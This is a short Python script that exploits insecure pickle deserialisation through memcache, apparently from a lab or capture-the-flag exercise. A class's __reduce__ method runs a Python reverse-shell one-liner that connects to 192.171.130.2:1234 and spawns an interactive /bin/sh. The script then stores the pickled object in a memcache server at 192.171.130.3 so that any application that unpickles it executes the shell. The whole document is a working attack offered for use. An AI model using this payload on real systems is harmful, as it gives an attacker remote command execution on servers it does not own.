

import pickle
import subprocess
import os
from pymemcache.client.base import Client

class Shell(object):
    def __reduce__(self):
        return (os.system, ("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.171.130.2\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'&",))


client = Client(('192.171.130.3', 11211))
client.set("pickled",pickle.dumps(Shell()))
